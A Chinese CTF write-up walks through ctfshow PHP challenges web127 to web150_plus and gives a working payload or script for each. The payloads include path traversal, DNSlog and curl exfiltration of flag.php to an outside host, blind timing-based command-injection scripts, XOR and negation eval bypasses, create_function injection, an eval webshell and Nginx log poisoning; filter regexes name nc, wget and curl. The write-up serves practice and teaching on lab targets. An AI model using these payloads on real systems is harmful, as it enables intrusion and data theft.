![image-20240725160619167](https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240725160619167.png)

因为对不符合规则的变量转换一次, 本来是不需要构造的, 特殊字符的检测需要我们用空格来代替下划线; payload如下:

```
?ctf show=ilove36d
```

## web128

- 描述: 骚操作

```php
$f1 = $_GET['f1'];
$f2 = $_GET['f2'];

if(check($f1)){
    var_dump(call_user_func(call_user_func($f1,$f2)));
}else{
    echo "嗯哼？";
}

function check($str){
    return !preg_match('/[0-9]|[a-z]/i', $str);
}
```

`gettext`函数的[官方解释](https://www.php.net/manual/zh/book.gettext.php)和[进阶配置](https://www.cnblogs.com/lost-1987/articles/3309693.html), 可以了解到`_()`是等价于`gettext()`的, 很好的绕过了正则

`get_defined_vars` 函数, 返回由所有已定义变量所组成的数组

`call_user_func`会利用`_()`将`get_defined_vars`返还出来(就是输出还是输入), 然后再有一个call_user_func来调用get_defined_vars函数，然后利用var_dump函数输出就可以得到flag; payload:

```
?f1=_&f2=get_defined_vars
```

> 这里就没有用其他符号替代下划线的方法, 尝试替代之后发现payload失效
>
> f2可以等于phpinfo, 可以得到详细信息

## web129

- 描述: 常规操作

```php
if(isset($_GET['f'])){
    $f = $_GET['f'];
    if(stripos($f, 'ctfshow')>0){
        echo readfile($f);
    }
}
```

`stripos` 函数, 查找字符串首次出现的位置(不区分大小写), 如果没出现就返回FALSE

不知道在哪, 不知道读什么, 就去`/etc/passwd`或者`index.php`, 至于怎么绕过`stripos`, 访问不存在的目录再回来不就好了

```
?f=../ctfshow/../../../etc/passwd
```

那差不多就结束了, 现在只需要测试flag在哪里就可以了; payload:

```
?f=../ctfshow/../../../../var/www/html/flag.php
?f=/ctfshow/../../../../var/www/html/flag.php
```

## web130

- 描述: very very very（省略25万个very）ctfshow

```php
include("flag.php");
if(isset($_POST['f'])){
    $f = $_POST['f'];

    if(preg_match('/.+?ctfshow/is', $f)){
        die('bye!');
    }
    if(stripos($f, 'ctfshow') === FALSE){
        die('bye!!');
    }
    echo $flag;
}
```

首先检查变量`$f`中是否包含(不区分大小写, 且可以跨越多行), 以任意字符(但尽可能少)开头, 紧接着是`ctfshow`这个字符串的文本, 例如/ctfshow

然后因为`stripos`函数返回的是数字, 肯定不会强等于FALSE, 所以在任何位置出现特停字符串即可; 以上两个过滤都是形同虚设, payload如下:

```
POST: f=ctfshow
```

看不懂的也可以直接利用正则最大回溯次数绕过([洞悉正则最大回溯/递归限制](https://www.laruence.com/2010/06/08/1579.html)): PHP为了防止正则表达式的拒绝服务攻击(reDOS), 给 pcre设定了一个回溯次数上限`pcre.backtrack_limit`; 回溯次数上限默认是100万, 如果回溯次数超过了100 万, `preg_match`将不再返回1和0, 而是 false

```python
import requests
url="http://03771c3c-6afb-4457-a719-19cc6ccf922e.chall.ctf.show/"
data={
	'f':'very'*250000+'ctfshow'
}
r=requests.post(url,data=data)
print(r.text)
```

## web131

- 描述: 同上

```php
if(isset($_POST['f'])){
    $f = (String)$_POST['f'];
    if(preg_match('/.+?ctfshow/is', $f)){
        die('bye!');
    }
    if(stripos($f,'36Dctfshow') === FALSE){
        die('bye!!');
    }
    echo $flag;
}
```

将传入的类型强制变成了字符串(所以说上一题用数组也可以绕过?), 这下不得不利用正则最大回溯绕过了, 里面参杂一个36Dctfshow即可, 脚本还是用上面那个

## web132

- 描述: 为什么会这样？

打开来是一个网页, /robots.txt中找到后台登录界面/admin

```php
include("flag.php");
highlight_file(__FILE__);
if(isset($_GET['username']) && isset($_GET['password']) && isset($_GET['code'])){
    $username = (String)$_GET['username'];
    $password = (String)$_GET['password'];
    $code = (String)$_GET['code'];

    if($code === mt_rand(1,0x36D) && $password === $flag || $username ==="admin"){
        if($code == 'admin'){
            echo $flag;
        }
    }
}
```

运算优先级虽然`&&`是大于`||`, 但是只要`$username=admin`, 整个判断式为真(或只要一边为真即为真)

所以只需要`$username=$code=admin`即可, payload如下:

```
/admin/?username=admin&password=1&code=admin
```

## web133

- 描述: 同上
- 官方推荐: [ctfshow web133和其他命令执行的骚操作](https://blog.csdn.net/qq_46091464/article/details/109095382)

```php
//flag.php
if($F = @$_GET['F']){
    if(!preg_match('/system|nc|wget|exec|passthru|netcat/i', $F)){
        eval(substr($F,0,6));
    }else{
        die("6个字母都还不够呀?!");
    }
}
```

限制为6个字符, 但是它没有对传入的变量`$F`进行操作, 仅仅只是截取了前六个字符然后放进了`eval`函数

所以可以尝试变量覆盖,刚好构造6个字符(自己覆盖自己也是覆盖):

```
?F=`$F`;%20
```

> 利用touch 1测试能否写入文件, 发现不可写入
>
> 本题似乎没有回显, 尝试ls也不能整出点啥来

不可写, 那么也不能将内容存储下来然后读取了, 那怎么办呢

先去[网站](http://www.dnslog.cn/)获取一个域名, 比如 k700a2.dnslog.cn, 然后尝试执行命令将数据发到这个域名:

```
?F=`$F`;%20ping `cat flag.php`.k700a2.dnslog.cn -c 1
```

因为flag.php内容太多, 所以不会收到任何信息(二级域名是有长度限制的); 我们需要增加一些过滤器:

```
?F=`$F`; ping `cat flag.php | grep ctfshow | tr -cd '[a-z]'/'[0-9]'`.zfiu19.dnslog.cn -c 1
```

按理来说现在刷新数据将会得到不含特殊符号的flag, 我无论如何都无法得到内容, 所以我决定用公网vps

利用`curl`命令将文件发送给vps

```
#其中-F 为带文件的形式发送post请求
#xx是上传文件的name值，flag.php就是上传的文件
?F=`$F`;+curl -X POST -F xx=@flag.php  http://172.22.32.177/10000
```

> 诶你先别急, 我搞不出来, 到时候再说

## web134

- 描述: 为什么会那样？

```php
$key1 = 0;
$key2 = 0;
if(isset($_GET['key1']) || isset($_GET['key2']) || isset($_POST['key1']) || isset($_POST['key2'])) {
    die("nonononono");
}
@parse_str($_SERVER['QUERY_STRING']);
extract($_POST);
if($key1 == '36d' && $key2 == '36d') {
    die(file_get_contents('flag.php'));
}
```

老熟人`extract`函数, 从数组中将变量导入到当前的符号表, 常常用在变量覆盖

所以绕过最上方的判断再利用变量覆盖即可, payload如下:

```
?_POST[key1]=36d&_POST[key2]=36d
```

GET我没试过?反正就是POST->GET

## web135

- 描述: web133plus

其实就是web133wp中的另一种解法

```php
//flag.php
if($F = @$_GET['F']){
    if(!preg_match('/system|nc|wget|exec|passthru|bash|sh|netcat|curl|cat|grep|tac|more|od|sort|tail|less|base64|rev|cut|od|strings|tailf|head/i', $F)){
        eval(substr($F,0,6));
    }else{
        die("师傅们居然破解了前面的，那就来一个加强版吧");
    }
}
```

payload:

```
`$F`;+ping `cat flag.php|awk 'NR==2'`.6x1sys.dnslog.cn
#通过ping命令去带出数据，然后awk NR一排一排的获得数据
```

## web136

- 描述: BY yu22x

```php
<?php
error_reporting(0);
function check($x){
    if(preg_match('/\\$|\.|\!|\@|\#|\%|\^|\&|\*|\?|\{|\}|\>|\<|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i', $x)){
        die('too young too simple sometimes naive!');
    }
}
if(isset($_GET['c'])){
    $c=$_GET['c'];
    check($c);
    exec($c);
}
else{
    highlight_file(__FILE__);
}
?>
```

exec是没有回显的, 我们尝试将执行结果输出到可读文件

```
?c=ls | tee 1
```

然后访问该地址(url/1)下载下来, 发现命令可执行, 文件中有当前目录的文件, 其余命令执行照搬即可; payload:

```
# 找到flag
ls / | tee 2
# 读取flag
cat /f149_15_h3r3|tee 3
```

## web137

- 描述: 没有难度

```php
class ctfshow
{
    function __wakeup(){
        die("private class");
    }
    static function getFlag(){
        echo file_get_contents("flag.php");
    }
}
call_user_func($_POST['ctfshow']);
```

能利用的点只有`call_user_func`, [函数详解](https://www.php.net/manual/zh/function.call-user-func.php)

在**示例#3**中, 有利用`call_user_func`来调用一个类里面的方法, 照葫芦画瓢就能拿下payload:

```
POST:
ctfshow=ctfshow::getFlag
```

## web138

- 描述: 一丢丢难度

```php
class ctfshow
{
    function __wakeup(){
        die("private class");
    }
    static function getFlag(){
        echo file_get_contents("flag.php");
    }
}

if(strripos($_POST['ctfshow'], ":")>-1){
    die("private function");
}

call_user_func($_POST['ctfshow']);
```

这下过滤了`:`了

但是在`call_user_func`函数文档的**示例#4**中, 可以发现该函数是支持数组传入且不需要冒号, 那么可以利用数组传递payload:

```
POST:
ctfshow[0]=ctfshow&ctfshow[1]=getFlag
```

## web139

- 描述: BY YU22X, 没变化吗？

```php
<?php
error_reporting(0);
function check($x){
    if(preg_match('/\\$|\.|\!|\@|\#|\%|\^|\&|\*|\?|\{|\}|\>|\<|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i', $x)){
        die('too young too simple sometimes naive!');
    }
}
if(isset($_GET['c'])){
    $c=$_GET['c'];
    check($c);
    exec($c);
}
else{
    highlight_file(__FILE__);
}
?>
```

tee写文件的方式不行了, 应该是权限不足的问题

至于脚本, 我更是不懂, 用的是类似于sql盲注的方法, 我直接给出来了:

跑目录下的文件(其实只需要改一下payload就是获取flag的)

```python
import requests
import time
import string

# 构建一个包含所有字母和数字以及部分符号的字符串，符号可以自己加
str = string.ascii_letters + string.digits + "-" + "{" + "}" + "_" + "~"
# 初始化一个空字符串，用于保存结果
result = ""

#获取多少行
for i in range(1, 99):
    key = 0   #用于控制内层循环(j)的结束

    #不break的情况下，一行最多几个字符
    for j in range(1, 99):
        if key == 1:
            break
        #n就是一个一个一个的返回值
        for n in str:
            #{n}是占位符
            payload = "if [ `ls /|awk 'NR=={0}'|cut -c {1}` == {2} ];then sleep 3;fi".format(i, j, n)
            #print(payload)
            url = "http://89e3e82d-d133-4a9e-a883-790d41e8a3b8.challenge.ctf.show?c=" + payload
            try:
                #设置超时时间为 2.5 秒, 包括连接超时和读取超时, 超时就是之前sleep 3
                requests.get(url, timeout=(2.5, 2.5))

            # 如果请求发生异常, 表示条件满足, 将当前字符 n 添加到结果字符串中, 并结束当前内层循环
            except:
                result = result + n
                print(result)
                break
            if n == '~':    #str的最后一位，“~”不常出现，用作结尾
                key = 1
    # 在每次获取一个字符后，将一个空格添加到结果字符串中，用于分隔结果的不同位置
    result += " "
```

获取flag:

```python
import requests
import time
import string

# 题目过滤花括号，这里就不加了
str = string.digits + string.ascii_lowercase + "-" + "_" + "~"
result = ""
for j in range(1, 99):
    for n in str:
        payload = "if [ `cat /f149_15_h3r3 |cut -c {0}` == {1} ];then sleep 3;fi".format(j, n)
        # print(payload)
        url = "http://89e3e82d-d133-4a9e-a883-790d41e8a3b8.challenge.ctf.show?c=" + payload
        try:
            requests.get(url, timeout=(2.5, 2.5))
        except:
            result = result + n
            print(result)
            break
        if n=="~":
            result = result + "花括号"
```

## web140

- 描述: 没难度

```php
error_reporting(0);
highlight_file(__FILE__);
if(isset($_POST['f1']) && isset($_POST['f2'])){
    $f1 = (String)$_POST['f1'];
    $f2 = (String)$_POST['f2'];
    if(preg_match('/^[a-z0-9]+$/', $f1)){
        if(preg_match('/^[a-z0-9]+$/', $f2)){
            $code = eval("return $f1($f2());");
            if(intval($code) == 'ctfshow'){
                echo file_get_contents("flag.php");
            }
        }
    }
}
```

假的没难度, 这里用的是松散比较的漏洞绕过(弱比较), 0和字符串弱比较的时候就为真,所以使得`$code`为0即可让程序输出flag

payload:

```
POST:
f1=intval&f2=intval
f1=usleep&f2=usleep
```

附上一张松散比较的图, 从大佬那里拿过来的:

![](https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/c6006c6461a077cf957947b91553644a.png)

## web141

- 描述: 难度无

```php
if(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){
    $v1 = (String)$_GET['v1'];
    $v2 = (String)$_GET['v2'];
    $v3 = (String)$_GET['v3'];

    if(is_numeric($v1) && is_numeric($v2)){
        if(preg_match('/^\W+$/', $v3)){
            $code =  eval("return $v1$v3$v2;");
            echo "$v1$v3$v2 = ".$code;
        }
    }
}
```

`if(preg_match('/^\W+$/', $v3))`是一段 PHP 代码, 它使用了正则表达式函数`preg_match`来检查变量`$v3`的值是否完全由非单词字符组成

而在php中, 数字是可以和命令进行一些运算的, 减一加一都是可以正常执行的

下面给出取反程序, 其他[大佬博客](https://blog.csdn.net/miuzzx/article/details/109143413)一并给出

```php
<?php
//在命令行中运行
/*author yu22x*/
fwrite(STDOUT,'[+]your function: ');
$system=str_replace(array("\r\n", "\r", "\n"), "", fgets(STDIN));
fwrite(STDOUT,'[+]your command: ');
$command=str_replace(array("\r\n", "\r", "\n"), "", fgets(STDIN));
echo '[*] (~'.urlencode(~$system).')(~'.urlencode(~$command).');';
?>
```

尝试执行命令, 是可以执行的

```
?v1=1&v3=-(~%8C%86%8C%8B%9A%92)(~%93%8C)-&v2=1
```

![image-20240727212800008](https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240727212800008.png)

读取flag:

```
?v1=1&v2=1&v3=-(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%D5)-
# tac f*
```

## web142

- 描述: 难度0

```php
if(isset($_GET['v1'])){
    $v1 = (String)$_GET['v1'];
    if(is_numeric($v1)){
        $d = (int)($v1 * 0x36d * 0x36d * 0x36d * 0x36d * 0x36d);
        sleep($d);
        echo file_get_contents("flag.php");
    }
}
```

强制转换为字符串然后判断是否为数字, 如果传入的值不为0则会睡眠很久

直接传入0就行了, 或者是0x0, 原因是被当成八进制和十六进制的0; payload:

```
?v1=0
?v1=0x0
```

## web143

- 描述: 141的plus版本

```php
if(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){
    $v1 = (String)$_GET['v1'];
    $v2 = (String)$_GET['v2'];
    $v3 = (String)$_GET['v3'];
    if(is_numeric($v1) && is_numeric($v2)){
        if(preg_match('/[a-z]|[0-9]|\+|\-|\.|\_|\||\$|\{|\}|\~|\%|\&|\;/i', $v3)){
                die('get out hacker!');
        }
        else{
            $code =  eval("return $v1$v3$v2;");
            echo "$v1$v3$v2 = ".$code;
        }
    }
}
```

`~`没了, 但是还有`^`可以用, 然后用乘除代替加减

```python
# -- coding:UTF-8 --
# Author:dota_st
# Date:2021/2/10 12:56
# blog: www.wlhhlc.top
import requests
import urllib
import re

# 生成可用的字符
def write_rce():
    result = ''
    preg = '[a-z]|[0-9]|\+|\-|\.|\_|\||\$|\{|\}|\~|\%|\&|\;'
    for i in range(256):
        for j in range(256):
            if not (re.match(preg, chr(i), re.I) or re.match(preg, chr(j), re.I)):
                k = i ^ j
                if k >= 32 and k <= 126:
                    a = '%' + hex(i)[2:].zfill(2)
                    b = '%' + hex(j)[2:].zfill(2)
                    result += (chr(k) + ' ' + a + ' ' + b + '\n')
    f = open('xor_rce.txt', 'w')
    f.write(result)


# 根据输入的命令在生成的txt中进行匹配
def action(arg):
    s1 = ""
    s2 = ""
    for i in arg:
        f = open("xor_rce.txt", "r")
        while True:
            t = f.readline()
            if t == "":
                break
            if t[0] == i:
                s1 += t[2:5]
                s2 += t[6:9]
                break
        f.close()
    output = "(\"" + s1 + "\"^\"" + s2 + "\")"
    return (output)


def main():
    write_rce()
    while True:
        s1 = input("\n[+] your function：")
        if s1 == "exit":
            break
        s2 = input("[+] your command：")
        param = action(s1) + action(s2)
        print("\n[*] result:\n" + param)

main()

```

payload:

```
?v1=1&v2=1&v3=*("%0c%06%0c%0b%05%0d"^"%7f%7f%7f%7f%60%60")("%0b%01%03%00%06%00"^"%7f%60%60%20%60%2a")*
```

## web144

- 描述: 143的plus版本

```php
if(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){
    $v1 = (String)$_GET['v1'];
    $v2 = (String)$_GET['v2'];
    $v3 = (String)$_GET['v3'];

    if(is_numeric($v1) && check($v3)){
        if(preg_match('/^\W+$/', $v2)){
            $code =  eval("return $v1$v3$v2;");
            echo "$v1$v3$v2 = ".$code;
        }
    }
}

function check($str){
    return strlen($str)===1?true:false;
}
```

换成v2罢了, 直接用web141的套; payload:

```
?v1=1&v3=1&v2=-(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%D5)
```

## web145

- 描述: 144的plus版本

```php
if(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){
    $v1 = (String)$_GET['v1'];
    $v2 = (String)$_GET['v2'];
    $v3 = (String)$_GET['v3'];
    if(is_numeric($v1) && is_numeric($v2)){
        if(preg_match('/[a-z]|[0-9]|\@|\!|\+|\-|\.|\_|\$|\}|\%|\&|\;|\<|\>|\*|\/|\^|\#|\"/i', $v3)){
                die('get out hacker!');
        }
        else{
            $code =  eval("return $v1$v3$v2;");
            echo "$v1$v3$v2 = ".$code;
        }
    }
}
```

运算符号也过滤了, 没事可以用三目运算符: 以下命令是可以执行的:

```php
eval("return 1?phpinfo():1;");
```

所以继续用之前的web141取反payload:

```
?v1=1&v2=1&v3=?(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%D5):
```

## web146

- 描述: 145的plus版本

```php
if(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){
    $v1 = (String)$_GET['v1'];
    $v2 = (String)$_GET['v2'];
    $v3 = (String)$_GET['v3'];
    if(is_numeric($v1) && is_numeric($v2)){
        if(preg_match('/[a-z]|[0-9]|\@|\!|\:|\+|\-|\.|\_|\$|\}|\%|\&|\;|\<|\>|\*|\/|\^|\#|\"/i', $v3)){
                die('get out hacker!');
        }
        else{
            $code =  eval("return $v1$v3$v2;");
            echo "$v1$v3$v2 = ".$code;
        }
    }
}
```

三元运算符也没了, 继续换, 换成或, 然后继续用payload:

```
?v1=1&v2=1&v3=|(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%D5)|
```

还可以是以下的:

```
eval("return 1==phpinfo()||1;");
?v1=1&v2=1&v3===(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%D5)||
```

## web147

- 描述: RCE

```php
if(isset($_POST['ctf'])){
    $ctfshow = $_POST['ctf'];
    if(!preg_match('/^[a-z0-9_]*$/isD',$ctfshow)) {
        $ctfshow('',$_GET['show']);
    }
}
```

限制这个函数不能以数字, 字母和下划线开头, 然后这个函数的第一个参数是不可控的, 只能控制第二个参数

首先利用[命名空间](https://blog.csdn.net/xuaner8786/article/details/137606539?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522172240398016800213066504%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=172240398016800213066504&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-137606539-null-null.142^v100^pc_search_result_base6&utm_term=php%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4&spm=1018.2226.3001.4187)绕过正则:

[关于"\\"绕过正则题目-easy-function](https://paper.seebug.org/755/)

```
POST:
ctf=\phpinfo	# 这是不能执行的, 因为两个参数会报错
```

然后利用[匿名函数](https://blog.csdn.net/qq_63347711/article/details/128673190?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522172240500816800226510140%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=172240500816800226510140&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-128673190-null-null.142^v100^pc_search_result_base6&utm_term=php%E5%8C%BF%E5%90%8D%E5%87%BD%E6%95%B0&spm=1018.2226.3001.4187)进行构造, `create_function()`代码注入

GET传入大括号对`if`语句进行闭合, 再跟上phpinfo();, 最后注释掉后面的部分即可

![image-20240731141349659](https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240731141349659.png)

原理如下:

```php
create_function('$a','echo 1;}phpinfo();//')

# 等价于
function f($a) {
  echo 1;}phpinfo();//
}

# 美化
function f($a) {
  echo 1;
}
phpinfo();
//}
```

payload:

```
GET:
?show=}system("tac f*");//
POST:
ctf=\create_function
```

## web148

- 描述: 什么是变量？

```php
include 'flag.php';
if(isset($_GET['code'])){
    $code=$_GET['code'];
    if(preg_match("/[A-Za-z0-9_\%\\|\~\'\,\.\:\@\&\*\+\- ]+/",$code)){
        die("error");
    }
    @eval($code);
}
else{
    highlight_file(__FILE__);
}

function get_ctfshow_fl0g(){
    echo file_get_contents("flag.php");
}
```

异或和括号没过滤, 那就用web143异或的脚本改一下正则重新生成payload(肯定不是去调用函数了, 毕竟都有`eval`了)

```
?code=("%08%02%08%09%05%0d"^"%7b%7b%7b%7d%60%60")("%09%01%03%01%06%02"^"%7d%60%60%21%60%28");
```

## web149

- 描述: 你写的快还是我删的快？

```php
$files = scandir('./');
foreach($files as $file) {
    if(is_file($file)){
        if ($file !== "index.php") {
            unlink($file);
        }
    }
}

file_put_contents($_GET['ctf'], $_POST['show']);

$files = scandir('./');
foreach($files as $file) {
    if(is_file($file)){
        if ($file !== "index.php") {
            unlink($file);
        }
    }
}
```

1. 扫描当前目录, 如果该目录下有除了`index.php`的文件则全部删除
2. 文件写入操作
3. 再次删除`index.php`外的所有文件

那么只需要覆盖/替换`index.php`内容就可以了

```
GET:
?ctf=index.php
POST:
show=<?php @eval($_POST[cmd]); ?>
```

然后就是命令执行

```
POST:
cmd=system("tac /ctfshow_fl0g_here.txt");
```

## web150

- 描述: 对我们以前的内容进行了小结，我们文件上传系列再见！

```php
include("flag.php");
class CTFSHOW{
    private $username;
    private $password;
    private $vip;
    private $secret;

    function __construct(){
        $this->vip = 0;
        $this->secret = $flag;
    }

    function __destruct(){
        echo $this->secret;
    }

    public function isVIP(){
        return $this->vip?TRUE:FALSE;
        }
    }

    function __autoload($class){
        if(isset($class)){
            $class();
    }
}

#过滤字符
$key = $_SERVER['QUERY_STRING'];
if(preg_match('/\_| |\[|\]|\?/', $key)){
    die("error");
}
$ctf = $_POST['ctf'];
extract($_GET);
if(class_exists($__CTFSHOW__)){
    echo "class is exists!";
}

if($isVIP && strrpos($ctf, ":")===FALSE){
    include($ctf);
}
```

上面那一大串都没用; 因为`$ctf`除了过滤冒号就没有任何过滤就可以进行包含, isVIP可以变量覆盖, 查看中间件发现有Nginx, 尝试日志包含

```
User-Agent: <?php @eval($_POST[cmd]); ?>
```

payload:

```
GET:
?isVIP=true
POST:
ctf=/var/log/nginx/access.log&cmd=system("tac f*");
```

## web150_plus

- 描述: 修复了非预期

```php
include("flag.php");
error_reporting(0);
highlight_file(__FILE__);

class CTFSHOW{
    private $username;
    private $password;
    private $vip;
    private $secret;

    function __construct(){
        $this->vip = 0;
        $this->secret = $flag;
    }

    function __destruct(){
        echo $this->secret;
    }

    public function isVIP(){
        return $this->vip?TRUE:FALSE;
        }
}
# 这里经过出题人精心构造, 让你误以为是上面那个类的方法, 给你改回来了
function __autoload($class){
    if(isset($class)){
        $class();
    }
}

#过滤字符
$key = $_SERVER['QUERY_STRING'];
if(preg_match('/\_| |\[|\]|\?/', $key)){
    die("error");
}
$ctf = $_POST['ctf'];
extract($_GET);
if(class_exists($__CTFSHOW__)){
    echo "class is exists!";
}

if($isVIP && strrpos($ctf, ":")===FALSE && strrpos($ctf,"log")===FALSE){
    include($ctf);
}
```

不给用日志包含了, 注意`__autoload`是独立的, 不属于CTFSHOW类

> 在代码中新建一个对象，找不到对应的类的时候会调用`__autoload`

在程序中检查了`$__CTFSHOW__`是否存在, 所以肯定会调用`__autoload`, 现在只需要控制`$__CTFSHOW__`即可, 而前面刚好有个`extract($_GET);`, 先尝试利用

记得下划线绕过, 不过这里仅剩小数点了

```
?..CTFSHOW..=phpinfo
```

发现成功执行, 然后搜索ctfshow就能发现flag
